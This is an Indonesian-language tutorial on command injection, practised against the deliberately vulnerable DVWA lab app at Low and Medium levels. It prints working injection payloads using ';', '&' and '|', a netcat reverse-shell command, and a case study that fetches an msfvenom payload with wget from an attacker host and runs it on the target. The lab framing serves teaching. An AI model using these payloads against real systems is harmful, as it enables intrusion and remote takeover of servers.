# Command Injection

Command Injection adalah celah keamanan yang memungkinkan penyerang mengeksekusi perintah sistem melalui input yang tidak difilter dengan baik.

Untuk belajar, kita bisa coba di aplikasi web untuk belajar misalnya DVWA.

## Eksploitasi

Misalnya ada fitur ping IP, dan kita input:

```
192.168.1.99
```

Output-nya akan menampilkan hasil seperti kita melakukan commmand:

```
ping 192.168.1.99
```

Jika input tidak divalidasi dengan baik, kita bisa menyisipkan perintah tambahan.

### Tingkat: Low

Contoh payload:

```
192.168.1.99; ls -la
```

Reverse shell:

```
192.168.1.99; nc -e /bin/bash 192.168.1.100 12345
```

Langkah-langkah:

1. **Buka listener terlebih dahulu** di mesin attacker:

```
nc -lvp 12345
```

2. **Masukkan payload** ke input form target.

### Penjelasan:

- `;` digunakan untuk menambahkan perintah setelah perintah ping.

- Perintah `nc -e /bin/bash` akan membuat reverse shell ke IP dan port yang kita tentukan.

### Tingkat: Medium

Pada level ini, karakter seperti `;` dan `&&` terkena filter oleh aplikasi.

Alternatif yang bisa digunakan:

- `&`
- `|`

Contoh payload:

```
192.168.1.99 & ls -la
```

```
192.168.1.99 | ls -la
```

Efektivitas bergantung pada bagaimana aplikasi memproses input dan filter yang diterapkan.

## Studi Kasus

1. **Buat web server** yang berisi payload buatan kita menggunakan `msfvenom`.

2. **Taruh file payload** di path `/payload.py` sehingga dapat diakses dari server attacker (misalnya 192.168.1.99):

    ```
    http://192.168.1.99/payload.py
    ```

3. **Gunakan celah Command Injection** di target untuk mendownload payload:

    ```
    ; wget 192.168.1.99/payload.py
    ```

4. **Jalankan payload** di target (pastikan server attacker sudah membuka listener):

    ```
    ; python payload.py
    ```

5. **Server attacker menerima permintaan koneksi** dari server target setelah payload dijalankan.

## 📚 Belajar

[owasp.org/www-community/attacks/Command_Injection](https://owasp.org/www-community/attacks/Command_Injection)
